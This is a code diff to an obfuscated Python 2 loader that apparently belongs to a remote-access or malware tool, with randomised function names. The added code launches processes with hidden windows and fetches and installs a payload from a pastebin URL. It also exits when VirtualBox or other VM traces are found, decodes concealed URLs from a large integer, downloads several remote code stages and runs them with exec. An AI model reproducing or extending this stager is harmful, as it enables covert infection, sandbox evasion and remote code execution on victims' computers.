@@ -79,6 +79,13 @@ def main(*args, **kwargs):
             vector  = block
             result.append(output)
         return ''.join(result).rstrip("\x00")
+
+    def BouncyNaturalBreasts(path, shell=True):
+        info = subprocess.STARTUPINFO()
+        info.dwFlags = subprocess.STARTF_USESHOWWINDOW | subprocess.CREATE_NEW_PROCESS_GROUP
+        info.wShowWindow = subprocess.SW_HIDE
+        p = subprocess.Popen(path, startupinfo=info, shell=shell)
+        return p
         
     def CrystallineSluggishAnatomy(*args, **kwargs):
         IncontinentObtuseCucumber = lambda x: long(bytes(x).encode('hex'), 16)
@@ -116,15 +123,18 @@ def main(*args, **kwargs):
                                     RuthlessSpiffyTablecloth([SilkyPerilousManifesto, '-install'])
                                 if os.path.isfile(ZonkedEnthusiasticTadpole):
                                     os.remove(ZonkedEnthusiasticTadpole)
+                            elif 'pycrypto' in FoamyNonstopHistory and 'pastebin' in NobleRusticWalrus:
+                                ZonkedEnthusiasticTadpole = 'pycrypto-2.6.1-cp27-none-win_amd64.whl'
+                                with file(ZonkedEnthusiasticTadpole, 'wb') as fp:
+                                    fp.write(base64.b64decode(urllib.urlopen(NobleRusticWalrus).read()))
+                                RuthlessSpiffyTablecloth([GroovySophisticatedLemur, 'install', ZonkedEnthusiasticTadpole])
+                                if os.path.isfile(ZonkedEnthusiasticTadpole):
+                                    os.remove(ZonkedEnthusiasticTadpole)
                             else:
                                 try:
                                     RuthlessSpiffyTablecloth([GroovySophisticatedLemur, 'install', NobleRusticWalrus])
                                 except Exception as e:
                                     SeamlessGalacticSponges('Install error: {}'.format(str(e)))
-                        else:
-                            SeamlessGalacticSponges(FoamyNonstopHistory + ' loaded')
-                    else:
-                        SeamlessGalacticSponges(FoamyNonstopHistory + ' loaded')
             except Exception as e:
                 if __DEBUG__:
                     print("Load error: {}".format(str(e)))
@@ -133,28 +143,27 @@ def main(*args, **kwargs):
     s = 'tasklist' if os.name is 'nt' else 'ps'
     c = 0 if os.name is 'nt' else -1
     if 'checkvm' in kwargs:
-        if bool([i.split()[c] for i in os.popen(s).read().splitlines()[2:] if i.split()[c].lower().split('.')[0] in ['xenservice', 'vboxservice', 'vboxtray', 'vmusrvc', 'vmsrvc', 'vmwareuser', 'vmwaretray', 'vmtoolsd', 'vmcompute', 'vmmem'] if 'checkvm' in args]):
+        if bool([_ for _ in os.environ.keys() if 'VBOX' in _.upper()] + [i.split()[c] for i in os.popen(s).read().splitlines()[2:] if i.split()[c].lower().split('.')[0] in ['xenservice', 'vboxservice', 'vboxtray', 'vmusrvc', 'vmsrvc', 'vmwareuser', 'vmwaretray', 'vmtoolsd', 'vmcompute', 'vmmem'] if 'checkvm' in args]):
             if __DEBUG__:
                 print('aborting')
             sys.exit(0)
     if 'config' in kwargs:
         AccidentalAquaticCat        = CrystallineSluggishAnatomy(**kwargs)
-        SomberUnbecomingAmusement   = lambda x: bytes(bytearray.fromhex(hex(long('120950513014781697487772252820504293289885893009420441905241{}'.format(x))).strip('0x').strip('L')))
-        if 'z' in AccidentalAquaticCat: 
-            header = urllib.urlopen(SomberUnbecomingAmusement(AccidentalAquaticCat.get('j'))).read()
-            header = header.format(json.dumps(AccidentalAquaticCat))
-            footer = urllib.urlopen(SomberUnbecomingAmusement(AccidentalAquaticCat.get('z'))).read()
-            footer = base64.b64decode(footer)
-            body   = urllib.urlopen(SomberUnbecomingAmusement(AccidentalAquaticCat.get('u'))).read()
-            body   = QuadraticFungalLegend(body, footer)
-            code   = '\n\n\n'.join([body, header])
+        SomberUnbecomingAmusement   = lambda x: bytes(bytearray.fromhex(hex(long('120950513014781697487772252820504293289885893009420441905241%s' % x)).strip('0x').strip('L')))
+        if 'z' in AccidentalAquaticCat:
+            head = urllib.urlopen(SomberUnbecomingAmusement(AccidentalAquaticCat.get('j'))).read()
+            head = head + "\n\nif __name__ == '__main__':\n\tglobal ___kwarg___\n\t___kwarg___ = {}\n\tmain(**___kwarg___)".format(json.dumps(AccidentalAquaticCat))
+            foot = urllib.urlopen(SomberUnbecomingAmusement(AccidentalAquaticCat.get('z'))).read()
+            foot = base64.b64decode(foot)
+            body = urllib.urlopen(SomberUnbecomingAmusement(AccidentalAquaticCat.get('u'))).read()
+            body = QuadraticFungalLegend(body, foot)
+            pkgs = urllib.urlopen(SomberUnbecomingAmusement(AccidentalAquaticCat.get('w'))).read()
         else:
-            data = urllib.urlopen(SomberUnbecomingAmusement(AccidentalAquaticCat.get('u'))).read()
-            text = urllib.urlopen(SomberUnbecomingAmusement(AccidentalAquaticCat.get('j'))).read()
-            text = text.format(json.dumps(AccidentalAquaticCat))
-            code = '\n\n\n'.join([data, text])
-        exec code in globals()
-
+            head = urllib.urlopen(SomberUnbecomingAmusement(AccidentalAquaticCat.get('j'))).read()
+            head = head + "\n\nif __name__ == '__main__':\n\tglobal ___kwarg___\n\t___kwarg___ = {}\n\tmain(**___kwarg___)".format(json.dumps(AccidentalAquaticCat))
+            body = urllib.urlopen(SomberUnbecomingAmusement(AccidentalAquaticCat.get('u'))).read()
+            pkgs = urllib.urlopen(SomberUnbecomingAmusement(AccidentalAquaticCat.get('w'))).read()
+        exec '\n\n\n'.join([pkgs, body, head]) in globals()
 
 
 if __name__ == '__main__':
